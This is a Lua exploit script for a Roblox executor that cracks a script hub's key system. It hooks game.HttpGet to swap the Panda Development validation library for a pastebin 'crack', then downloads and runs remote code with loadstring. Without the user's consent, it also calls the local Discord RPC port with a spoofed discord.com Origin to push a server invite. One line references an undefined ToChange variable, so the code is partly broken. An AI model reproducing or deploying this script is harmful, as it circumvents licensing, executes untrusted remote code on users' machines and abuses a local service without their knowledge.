repeat wait() until game:IsLoaded()
if not hookfunction then return end

local Variables = {
	HttpService = game:GetService("HttpService"),
	Request = (syn and syn.request) or (http and http.request) or http_request,
	ToChange = "https://pandadevelopment.net/service_api/PandaBetaLib.lua",
	Crack = "https://pastebin.com/raw/QUwEYGMS",
	Service = "beanhub",
	Library = {}
}

Variables.Request({
    Url = 'http://127.0.0.1:6463/rpc?v=1',
    Method = 'POST',
    Headers = {
        ['Content-Type'] = 'application/json',
        Origin = 'https://discord.com'
    },
    Body = Variables.HttpService:JSONEncode({
        cmd = 'INVITE_BROWSER',
        nonce = Variables.HttpService:GenerateGUID(false),
        args = {code = "cZfYYb9Kvm"}
    })
})

function Variables.Library:Load(HTTP)
	local Sucess, Response = pcall(function()
		local Old; Old = hookfunction(game.HttpGet, function(A,B,C)
			if B == Variables.ToChange then
				B = Variables.Crack
			end
			return Old(A,B,C)
		end)
	end)
	if Sucess then loadstring(game:HttpGet(HTTP))() 
		loadstring(game:HttpGet((ToChange)))():ValidateKey(Variables.Service, Variables.Service.." - NOBRU_APELAO")
	end
end

return Variables.Library
